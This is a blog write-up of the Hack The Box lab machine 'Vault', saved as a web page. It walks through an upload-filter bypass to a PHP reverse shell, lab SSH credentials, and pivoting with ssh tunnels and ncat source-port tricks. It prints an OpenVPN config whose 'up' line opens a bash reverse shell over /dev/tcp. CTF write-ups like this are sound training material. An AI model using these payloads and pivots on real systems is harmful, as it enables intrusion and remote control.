<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Hack The Box - Vault - 0xRick’s Blog</title>
<meta name="description" content="My write-up / walkthrough for Vault from Hack The Box.">


  <meta name="author" content="0xRick">
  
  <meta property="article:author" content="0xRick">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en">
<meta property="og:site_name" content="0xRick's Blog">
<meta property="og:title" content="Hack The Box - Vault">
<meta property="og:url" content="https://0xrick.github.io/hack-the-box/vault/">


  <meta property="og:description" content="My write-up / walkthrough for Vault from Hack The Box.">





  <meta name="twitter:site" content="@ahm3d_h3sham">
  <meta name="twitter:title" content="Hack The Box - Vault">
  <meta name="twitter:description" content="My write-up / walkthrough for Vault from Hack The Box.">
  <meta name="twitter:url" content="https://0xrick.github.io/hack-the-box/vault/">

  
    <meta name="twitter:card" content="summary">
    
  

  



  <meta property="article:published_time" content="2019-04-06T07:00:00+02:00">






<link rel="canonical" href="https://0xrick.github.io/hack-the-box/vault/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "0xRick",
      "url": "https://0xrick.github.io/"
    
  }
</script>







<!-- end _includes/seo.html -->




<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
        <a class="site-title" href="/">
          0xRick's Blog
          
        </a>
        <ul class="visible-links">
<li class="masthead__menu-item">
              <a href="/about">About</a>
            </li>
<li class="masthead__menu-item">
              <a href="/categories">Categories</a>
            </li>
<li class="masthead__menu-item">
              <a href="/tags">Tags</a>
            </li>
</ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/images/avatar.jpg" alt="0xRick" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">0xRick</h3>
    
    
      <div class="author__bio" itemprop="description">
        

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Somewhere between 1's and 0's</span>
        </li>
      

      
        
          
            <li><a href="/" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">Home Page</span></a></li>
          
        
          
            <li><a href="https://twitter.com/ahm3d_h3sham" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://github.com/0xRick" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">Github</span></a></li>
          
        
          
            <li><a href="https://www.buymeacoffee.com/VGEfcAqvn" rel="noopener noreferrer" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">buymeacoffee</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>
 
  
  </div>


  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Hack The Box - Vault">
    <meta itemprop="description" content="Hack The Box - VaultQuick SummaryHey guys today Vault retired and here is my write-up about it. Vault was a fun box and it’s absolutely one of my favorites. Starting with an insecure file upload functionality to escaping from a host to another and getting a reverse shell with an openvpn config , Every step was very nice. It’s rated as medium , it’s a linux box and its ip is 10.10.10.109 I added it to /etc/hosts as vault.htb. Let’s jump right in !NmapAs always we will start with nmap to scan for open ports and services :nmap -sV -sT -sC vault.htbOnly two ports are open : 80 running http and 22 running ssh. As always we will check http.HTTP Initial EnumerationThe main page is just displaying this message :Welcome to the Slowdaddy web interfaceWe specialise in providing financial orginisations with strong web and database solutions and we promise to keep your customers financial data safe.We are proud to announce our first client: Sparklays (Sparklays.com still under construction)	I ran gobuster but didn’t get anything , so I looked at the message again and noticed this line : We are proud to announce our first client: Sparklays (Sparklays.com still under construction). So I went to /sparklays and got a 403 response.So now we know that this directory exists and we can enumerate the sub directories of it , so I ran gobuster again and got these results :=====================================================Gobuster v2.0.0              OJ Reeves (@TheColonial)=====================================================[+] Mode         : dir[+] Url/Domain   : http://vault.htb/sparklays/[+] Threads      : 100[+] Wordlist     : /usr/share/wordlists/dirb/common.txt[+] Status codes : 200,204,301,302,307,403[+] Timeout      : 2m0s=====================================================2019/04/05 14:55:32 Starting gobuster=====================================================/.hta (Status: 403)/.htpasswd (Status: 403)/.htaccess (Status: 403)/admin.php (Status: 200)/design (Status: 301)/admin.php sounds interesting. But in fact it’s useless./admin.php :It asks for authentication , I tried test:test and got nothing. It didn’t print anything :And I also noticed that it’s sending the login data through GET parameters which is rarely used. Also checked the source of the page and there was nothing important so most likely this is just a rabbit hole and trying to bypass this login is a waste of time./design :Design gave us a 403 response , I ran gobuster one more time and got these results :=====================================================Gobuster v2.0.0              OJ Reeves (@TheColonial)=====================================================[+] Mode         : dir[+] Url/Domain   : http://vault.htb/sparklays/design/[+] Threads      : 100[+] Wordlist     : /usr/share/wordlists/dirb/common.txt[+] Status codes : 200,204,301,302,307,403[+] Timeout      : 2m0s=====================================================2019/04/05 15:03:20 Starting gobuster=====================================================/.htaccess (Status: 403)/.hta (Status: 403)/.htpasswd (Status: 403)/uploads (Status: 301)So I checked /uploads : And it was also forbidden. But since there is a directory for uploads then there might be a page for uploading files lying around somewhere. I ran gobuster again and added the extensions php and html and got a new result : design.html/design.html :There’s a link titled Change Logo which takes us to this upload page :Bypassing Restricted File UploadI created a small php script to get a reverse shell :And named it shell.php.Tried to upload and as expected , it told us that this file type is not allowed :We need to know what are the allowed file types , We will use Zap’s fuzzer and a file extenstions wordlist I got from seclists.Intercept the request –&gt; right click –&gt; attack –&gt; FuzzerBy filtering the response body size we will notice that all the responses are 519 bytes except the response of .php5 which is 526 bytes. So it allows files with extension .php5 to be uploaded.Since the request has already been sent then the php shell is on the server now , Let’s excute it :There are two users on the box alex and dave , user flag is not on the box. On the desktop of dave there is a file called ssh which has ssh credentials :Now we can get an ssh connection as dave instead of this reverse shell as www-data dave : Dav3therav3123 :Escaping from ubuntu to DNS , openvpn reverse shell , Getting userLet’s take a look at the rest of the files on dave’s desktop :No idea what to do with that key itscominghome so we will leave it for now. The other file is Servers :We have another ip now : 192.168.122.5 , We need to scan it but unfortunately nmap is not on the box :Alternatively we will use nc to scan the first 100 ports like this : nc -zv 192.168.122.5 1-100Port 80 is open and running http :Port 22 is open and running ssh :We need to take a look at http , but we can’t access that host directly , so we will set up an ssh tunnel to redirect port 80 to our local machine :ssh -L 1234:192.168.122.4:80 dave@vault.htbNow we can go to http://localhost:1234 and access that http service :DNS configurator gives us a 404 response :Vpn configurator allows us to create an ovpn file and execute it :At this point I stopped and searched on that topic , because I didn’t know how to get a reverse shell from an ovpn file , and this article really helped.We are going to listen on the first host (ubuntu) and use the ovpn configurator to get a reverse shell on the second host (DNS) , We need to know the ip address of ubuntu on that subnet, ifconfig :ip : 192.168.122.1Reverse shell payload :remote 192.168.122.1dev tunnobindscript-security 2 up &quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.122.1/9898 0&gt;&amp;1'&quot;I used nobind because as you can see there’s a note saying that nobind must be used. Let’s update the file and click on Test VPN then check our listener :And we owned user !SSH on DNSIn the /home directory of dave on DNS there’s a file called ssh which has ssh credentials :So we can close that reverse shell and get an ssh connection on DNS as dave dave : dav3gerous567:But we had root on DNS , now we are dave. We want to get root again. sudo -l tells us that dave can use sudo on any command :So we can easily get root again by sudo su :Auth.log EnumerationBy looking at Servers file again , which was on ubuntuWe notice that there’s a host called The Vault and its ip is not there , so probably we need to get to that host , but we need its ip first.After a lot of enumeration I looked into auth.log and noticed that on the 2nd of September at 15:10:20 and 15:10:34 these commands were executed :Part of the log :Sep  2 15:08:55 DNS sudo: pam_unix(sudo:session): session closed for user rootSep  2 15:09:01 DNS CRON[2459]: pam_unix(cron:session): session opened for user root by (uid=0)Sep  2 15:09:01 DNS CRON[2459]: pam_unix(cron:session): session closed for user rootSep  2 15:10:20 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53Sep  2 15:10:20 DNS sudo: pam_unix(sudo:session): session opened for user root by dave(uid=0)Sep  2 15:10:34 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53Sep  2 15:10:34 DNS sudo: pam_unix(sudo:session): session opened for user root bydave(uid=0)Sep  2 15:13:43 DNS sudo: pam_unix(sudo:session): session closed for user rootCommands :/usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53/usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53We have an ip (192.168.5.2) and we suspect that its the one we are looking for. I was using less to view the log so I searched for the ip to see if it was mentioned anywhere else :?192.168.5.2, And I found it here too :Command :/usr/bin/nmap 192.168.5.2 -Pn --source-port=4444On the same day at 15:07:51 That ip was scanned with nmap , and we notice --source-port=4444 , what’s that ?Source Port , Escaping from DNS to vaultLet’s take that nmap command and run it again to see the results : Port 987 is open and the service is unknown , Let’s run nmap one more time as a regular scan :nmap -Pn 192.168.5.2Port 53 and 4444 , both of them are closed. weird … where is port 987 ?So what’s happening is , port 987 is only open when the source port is 4444. When two hosts communicate with each other through a certain protocol , there’s a source port and a destination port , the source port is the port which the request was sent from and this port is randomly generated , the destination port is the port where the request is sent to , and it doesn’t change. So for example when communicating through http , the client sends the request from a source port which is random , that request is sent to the destination port which in this case is port 80.To be able to access port 987 we have to make sure that our source port is 4444. To do this we will use ncat and make it listen on port 2222 , then the service running on that port will be another ncat connection from port 4444 to port 987 on 192.168.5.2 ncat -l 2222 --sh-exec &quot;ncat -p 4444 192.168.5.2 987&quot;We will get another ssh connection to DNS , then we will connect to port 2222 on localhost , but before connecting we need to know what’s the service. Unfortunately nmap can’t tell us because our connection is not direct.So I guessed common services and it was ssh :I tried dave as the username and dav3gerous567 as the password (same credentials for DNS) and it worked.Decrypting root flagIn the /home directory of dave on vault there’s a file called root.txt.gpg :Which is the root flag but gpg encrypted :We need a key to decrypt the flag , remember the key we saw earlier on ubuntu ? We will copy the file to ubuntu to decrypt it , Easiest way to do it is to base64 encode it then copy the base64 data and decode it on ubuntu. But base64 was not installed on vault so I used base32 instead :Now let’s decrypt it with the key : itscominghome :gpg -d root.txt.gpgAnd we owned root !That’s it , Feedback is appreciated !Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter @Ahm3d_H3shamThanks for reading.Previous Hack The Box write-up : Hack The Box - CurlingNext Hack The Box write-up : Hack The Box - RedCross">
    <meta itemprop="datePublished" content="2019-04-06T07:00:00+02:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title p-name" itemprop="headline">
            <a href="https://0xrick.github.io/hack-the-box/vault/" class="u-url" itemprop="url">Hack The Box - Vault
</a>
          </h1>
          

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2019-04-06T07:00:00+02:00">April 6, 2019</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          9 minute read
        
      </span>
    
  </p>


        </header>
      

      <section class="page__content e-content" itemprop="text">
        <div>
          <style>
              #carbonads {
                border: 1px solid black;
                border-radius: 7px;
                border-spacing: 7px;
                display: block;
                overflow: hidden;
                padding: 1em;
                line-height: 1.5;
              }
              #carbonads span {
                position: relative;
                display: block;
                overflow: hidden;
              }
              .carbon-img img {
                display: block;
                float: left;
              }
              .carbon-text {
                display: block;
                font-size: .9em;
                text-align: end;
              }
              .carbon-poweredby {
                display: block;
                font-size: .8em;
                float: right;
                line-height: 1;
                letter-spacing: 1px;
                }
                </style>
                <br>   
          <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script> 
                <br>
        </div>
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title">
<i class="fas fa-file-alt"></i> Contents</h4></header>
              <ul class="toc__menu"><li>
<a href="#hack-the-box---vault">Hack The Box - Vault</a><ul>
<li><a href="#quick-summary">Quick Summary</a></li>
<li><a href="#nmap">Nmap</a></li>
<li><a href="#http-initial-enumeration">HTTP Initial Enumeration</a></li>
<li><a href="#bypassing-restricted-file-upload">Bypassing Restricted File Upload</a></li>
<li><a href="#escaping-from-ubuntu-to-dns--openvpn-reverse-shell--getting-user">Escaping from ubuntu to DNS , openvpn reverse shell , Getting user</a></li>
<li><a href="#ssh-on-dns">SSH on DNS</a></li>
<li><a href="#authlog-enumeration">Auth.log Enumeration</a></li>
<li><a href="#source-port--escaping-from-dns-to-vault">Source Port , Escaping from DNS to vault</a></li>
<li><a href="#decrypting-root-flag">Decrypting root flag</a></li>
</ul>
</li></ul>

            </nav>
          </aside>
        
        <h1 id="hack-the-box---vault">Hack The Box - Vault</h1>

<h2 id="quick-summary">Quick Summary</h2>
<p>Hey guys today Vault retired and here is my write-up about it. Vault was a fun box and it’s absolutely one of my favorites. Starting with an insecure file upload functionality to escaping from a host to another and getting a reverse shell with an <code class="language-plaintext highlighter-rouge">openvpn</code> config , Every step was very nice. It’s rated as medium , it’s a linux box and its ip is <code class="language-plaintext highlighter-rouge">10.10.10.109</code> I added it to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> as <code class="language-plaintext highlighter-rouge">vault.htb</code>. Let’s jump right in !
<br><img src="/images/hackthebox/vault/0.png" alt="" class="align-center"><br><br></p>

<h2 id="nmap">Nmap</h2>
<p>As always we will start with nmap to scan for open ports and services :
<code class="language-plaintext highlighter-rouge">nmap -sV -sT -sC vault.htb</code>
<br><img src="/images/hackthebox/vault/1.png" alt="" class="align-center"><br><br>
Only two ports are open : 80 running http and 22 running ssh. As always we will check http.<br></p>

<h2 id="http-initial-enumeration">HTTP Initial Enumeration</h2>
<p>The main page is just displaying this message :
<br><img src="/images/hackthebox/vault/2.png" alt="" class="align-center"><br><br></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Welcome to the Slowdaddy web interface

We specialise in providing financial orginisations with strong web and database solutions and we promise to keep your customers financial data safe.

We are proud to announce our first client: Sparklays (Sparklays.com still under construction)	

</code></pre></div></div>
<p>I ran <code class="language-plaintext highlighter-rouge">gobuster</code> but didn’t get anything , so I looked at the message again and noticed this line : <code class="language-plaintext highlighter-rouge">We are proud to announce our first client: Sparklays (Sparklays.com still under construction)</code>. So I went to <code class="language-plaintext highlighter-rouge">/sparklays</code> and got a <code class="language-plaintext highlighter-rouge">403</code> response.<br>
<br><img src="/images/hackthebox/vault/3.png" alt="" class="align-center"><br><br>
So now we know that this directory exists and we can enumerate the sub directories of it , so I ran gobuster again and got these results :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://vault.htb/sparklays/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 2m0s
=====================================================
2019/04/05 14:55:32 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/admin.php (Status: 200)
/design (Status: 301)
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">/admin.php</code> sounds interesting. But in fact it’s useless.<br>
<code class="language-plaintext highlighter-rouge">/admin.php</code> :
<br><img src="/images/hackthebox/vault/4.png" alt="" class="align-center"><br><br>
It asks for authentication , I tried <code class="language-plaintext highlighter-rouge">test:test</code> and got nothing. It didn’t print anything :
<br><img src="/images/hackthebox/vault/5.png" alt="" class="align-center"><br><br>
And I also noticed that it’s sending the login data through <code class="language-plaintext highlighter-rouge">GET</code> parameters which is rarely used. Also checked the source of the page and there was nothing important so most likely this is just a rabbit hole and trying to bypass this login is a waste of time.<br>
<code class="language-plaintext highlighter-rouge">/design</code> :
<br><img src="/images/hackthebox/vault/6.png" alt="" class="align-center"><br><br>
Design gave us a <code class="language-plaintext highlighter-rouge">403</code> response , I ran gobuster one more time and got these results :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://vault.htb/sparklays/design/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 2m0s
=====================================================
2019/04/05 15:03:20 Starting gobuster
=====================================================
/.htaccess (Status: 403)
/.hta (Status: 403)
/.htpasswd (Status: 403)
/uploads (Status: 301)
</code></pre></div></div>
<p>So I checked <code class="language-plaintext highlighter-rouge">/uploads</code> : 
<br><img src="/images/hackthebox/vault/7.png" alt="" class="align-center"><br><br>
And it was also forbidden. But since there is a directory for uploads then there might be a page for uploading files lying around somewhere. I ran gobuster again and added the extensions <code class="language-plaintext highlighter-rouge">php</code> and <code class="language-plaintext highlighter-rouge">html</code> and got a new result : <code class="language-plaintext highlighter-rouge">design.html</code>
<br><code class="language-plaintext highlighter-rouge">/design.html</code> :
<br><img src="/images/hackthebox/vault/8.png" alt="" class="align-center"><br><br>
There’s a link titled <code class="language-plaintext highlighter-rouge">Change Logo</code> which takes us to this upload page :
<br><img src="/images/hackthebox/vault/9.png" alt="" class="align-center"><br><br></p>

<h2 id="bypassing-restricted-file-upload">Bypassing Restricted File Upload</h2>
<p>I created a small <code class="language-plaintext highlighter-rouge">php</code> script to get a reverse shell :
<br><img src="/images/hackthebox/vault/10.png" alt="" class="align-center"><br><br>
And named it <code class="language-plaintext highlighter-rouge">shell.php</code>.<br>
Tried to upload and as expected , it told us that this file type is not allowed :
<br><img src="/images/hackthebox/vault/11.png" alt="" class="align-center"><br><br>
We need to know what are the allowed file types , We will use Zap’s fuzzer and a <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt" target="_blank" rel="noopener noreferrer">file extenstions wordlist</a> I got from seclists.<br>
Intercept the request –&gt; right click –&gt; attack –&gt; Fuzzer
<br><img src="/images/hackthebox/vault/12.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/vault/13.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/vault/14.png" alt="" class="align-center"><br><br>
By filtering the response body size we will notice that all the responses are <code class="language-plaintext highlighter-rouge">519</code> bytes except the response of <code class="language-plaintext highlighter-rouge">.php5</code> which is <code class="language-plaintext highlighter-rouge">526</code> bytes. So it allows files with extension <code class="language-plaintext highlighter-rouge">.php5</code> to be uploaded.<br>
<br><img src="/images/hackthebox/vault/15.png" alt="" class="align-center"><br><br>
Since the request has already been sent then the php shell is on the server now , Let’s excute it :
<br><img src="/images/hackthebox/vault/16.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/vault/17.png" alt="" class="align-center"><br><br>
There are two users on the box <code class="language-plaintext highlighter-rouge">alex</code> and <code class="language-plaintext highlighter-rouge">dave</code> , user flag is not on the box. On the desktop of <code class="language-plaintext highlighter-rouge">dave</code> there is a file called <code class="language-plaintext highlighter-rouge">ssh</code> which has ssh credentials :
<br><img src="/images/hackthebox/vault/18.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/vault/19.png" alt="" class="align-center"><br><br>
Now we can get an ssh connection as <code class="language-plaintext highlighter-rouge">dave</code> instead of this reverse shell as <code class="language-plaintext highlighter-rouge">www-data</code> 
<code class="language-plaintext highlighter-rouge">dave : Dav3therav3123</code> :
<br><img src="/images/hackthebox/vault/20.png" alt="" class="align-center"><br><br></p>

<h2 id="escaping-from-ubuntu-to-dns--openvpn-reverse-shell--getting-user">Escaping from <code class="language-plaintext highlighter-rouge">ubuntu</code> to <code class="language-plaintext highlighter-rouge">DNS</code> , <code class="language-plaintext highlighter-rouge">openvpn</code> reverse shell , Getting user</h2>
<p>Let’s take a look at the rest of the files on dave’s desktop :
<br><img src="/images/hackthebox/vault/21.png" alt="" class="align-center"><br><br>
No idea what to do with that key <code class="language-plaintext highlighter-rouge">itscominghome</code> so we will leave it for now. The other file is <code class="language-plaintext highlighter-rouge">Servers</code> :
<br><img src="/images/hackthebox/vault/22.png" alt="" class="align-center"><br><br>
We have another ip now : <code class="language-plaintext highlighter-rouge">192.168.122.5</code> , We need to scan it but unfortunately <code class="language-plaintext highlighter-rouge">nmap</code> is not on the box :
<br><img src="/images/hackthebox/vault/23.png" alt="" class="align-center"><br><br>
Alternatively we will use <code class="language-plaintext highlighter-rouge">nc</code> to scan the first 100 ports like this : 
<code class="language-plaintext highlighter-rouge">nc -zv 192.168.122.5 1-100</code>
<br>Port 80 is open and running http :
<br><img src="/images/hackthebox/vault/24.png" alt="" class="align-center"><br><br>
Port 22 is open and running ssh :
<br><img src="/images/hackthebox/vault/25.png" alt="" class="align-center"><br><br>
We need to take a look at http , but we can’t access that host directly , so we will set up an ssh tunnel to redirect port 80 to our local machine :
<code class="language-plaintext highlighter-rouge">ssh -L 1234:192.168.122.4:80 dave@vault.htb</code>
<br><img src="/images/hackthebox/vault/26.png" alt="" class="align-center"><br><br>
Now we can go to <code class="language-plaintext highlighter-rouge">http://localhost:1234</code> and access that http service :
<br><img src="/images/hackthebox/vault/27.png" alt="" class="align-center"><br><br>
DNS configurator gives us a <code class="language-plaintext highlighter-rouge">404</code> response :
<br><img src="/images/hackthebox/vault/28.png" alt="" class="align-center"><br><br>
Vpn configurator allows us to create an <code class="language-plaintext highlighter-rouge">ovpn</code> file and execute it :
<br><img src="/images/hackthebox/vault/29.png" alt="" class="align-center"><br><br>
At this point I stopped and searched on that topic , because I didn’t know how to get a reverse shell from an <code class="language-plaintext highlighter-rouge">ovpn</code> file , and <a href="https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da" target="_blank" rel="noopener noreferrer">this article</a> really helped.<br>
We are going to listen on the first host (<code class="language-plaintext highlighter-rouge">ubuntu</code>) and use the <code class="language-plaintext highlighter-rouge">ovpn</code> configurator to get a reverse shell on the second host (<code class="language-plaintext highlighter-rouge">DNS</code>) , We need to know the ip address of <code class="language-plaintext highlighter-rouge">ubuntu</code> on that subnet, <code class="language-plaintext highlighter-rouge">ifconfig</code> :
<br><img src="/images/hackthebox/vault/30.png" alt="" class="align-center"><br><br>
ip : <code class="language-plaintext highlighter-rouge">192.168.122.1</code>
Reverse shell payload :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remote 192.168.122.1
dev tun
nobind
script-security 2 
up "/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.122.1/9898 0&gt;&amp;1'"
</code></pre></div></div>
<p><br><img src="/images/hackthebox/vault/31.png" alt="" class="align-center"><br><br>
I used <code class="language-plaintext highlighter-rouge">nobind</code> because as you can see there’s a note saying that <code class="language-plaintext highlighter-rouge">nobind</code> must be used. Let’s update the file and click on <code class="language-plaintext highlighter-rouge">Test VPN</code> then check our listener :
<br><img src="/images/hackthebox/vault/32.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/vault/33.png" alt="" class="align-center"><br><br>
And we owned user !</p>

<h2 id="ssh-on-dns">SSH on DNS</h2>
<p>In the <code class="language-plaintext highlighter-rouge">/home</code> directory of <code class="language-plaintext highlighter-rouge">dave</code> on <code class="language-plaintext highlighter-rouge">DNS</code> there’s a file called <code class="language-plaintext highlighter-rouge">ssh</code> which has ssh credentials :
<br><img src="/images/hackthebox/vault/34.png" alt="" class="align-center"><br><br>
So we can close that reverse shell and get an ssh connection on <code class="language-plaintext highlighter-rouge">DNS</code> as <code class="language-plaintext highlighter-rouge">dave</code> <code class="language-plaintext highlighter-rouge">dave : dav3gerous567</code>:
<br><img src="/images/hackthebox/vault/35.png" alt="" class="align-center"><br><br>
But we had <code class="language-plaintext highlighter-rouge">root</code> on <code class="language-plaintext highlighter-rouge">DNS</code> , now we are <code class="language-plaintext highlighter-rouge">dave</code>. We want to get root again. <code class="language-plaintext highlighter-rouge">sudo -l</code> tells us that <code class="language-plaintext highlighter-rouge">dave</code> can use sudo on any command :
<br><img src="/images/hackthebox/vault/36.png" alt="" class="align-center"><br><br>
So we can easily get <code class="language-plaintext highlighter-rouge">root</code> again by <code class="language-plaintext highlighter-rouge">sudo su</code> :
<br><img src="/images/hackthebox/vault/37.png" alt="" class="align-center"><br><br></p>

<h2 id="authlog-enumeration">Auth.log Enumeration</h2>
<p>By looking at <code class="language-plaintext highlighter-rouge">Servers</code> file again , which was on <code class="language-plaintext highlighter-rouge">ubuntu</code>
<br><img src="/images/hackthebox/vault/22.png" alt="" class="align-center"><br><br>
We notice that there’s a host called <code class="language-plaintext highlighter-rouge">The Vault</code> and its ip is not there , so probably we need to get to that host , but we need its ip first.<br>
After a lot of enumeration I looked into <code class="language-plaintext highlighter-rouge">auth.log</code> and noticed that on the 2nd of September at <code class="language-plaintext highlighter-rouge">15:10:20</code> and <code class="language-plaintext highlighter-rouge">15:10:34</code> these commands were executed :
<br>Part of the log :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Sep  2 15:08:55 DNS sudo: pam_unix(sudo:session): session closed for user root
Sep  2 15:09:01 DNS CRON[2459]: pam_unix(cron:session): session opened for user root by (uid=0)
Sep  2 15:09:01 DNS CRON[2459]: pam_unix(cron:session): session closed for user root
Sep  2 15:10:20 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53
Sep  2 15:10:20 DNS sudo: pam_unix(sudo:session): session opened for user root by dave(uid=0)
Sep  2 15:10:34 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53
Sep  2 15:10:34 DNS sudo: pam_unix(sudo:session): session opened for user root by
dave(uid=0)
Sep  2 15:13:43 DNS sudo: pam_unix(sudo:session): session closed for user root
</code></pre></div></div>
<p><br><img src="/images/hackthebox/vault/38.png" alt="" class="align-center"><br><br>
Commands :
<br><code class="language-plaintext highlighter-rouge">/usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53</code>
<br><code class="language-plaintext highlighter-rouge">/usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53</code>
<br>We have an ip (<code class="language-plaintext highlighter-rouge">192.168.5.2</code>) and we suspect that its the one we are looking for. I was using <code class="language-plaintext highlighter-rouge">less</code> to view the log so I searched for the ip to see if it was mentioned anywhere else <code class="language-plaintext highlighter-rouge">:?192.168.5.2</code>, And I found it here too :
<br><img src="/images/hackthebox/vault/39.png" alt="" class="align-center"><br><br>
Command :
<br><code class="language-plaintext highlighter-rouge">/usr/bin/nmap 192.168.5.2 -Pn --source-port=4444</code>
<br>On the same day at <code class="language-plaintext highlighter-rouge">15:07:51</code> That ip was scanned with <code class="language-plaintext highlighter-rouge">nmap</code> , and we notice <code class="language-plaintext highlighter-rouge">--source-port=4444</code> , what’s that ?</p>

<h2 id="source-port--escaping-from-dns-to-vault">Source Port , Escaping from <code class="language-plaintext highlighter-rouge">DNS</code> to <code class="language-plaintext highlighter-rouge">vault</code>
</h2>
<p>Let’s take that nmap command and run it again to see the results : 
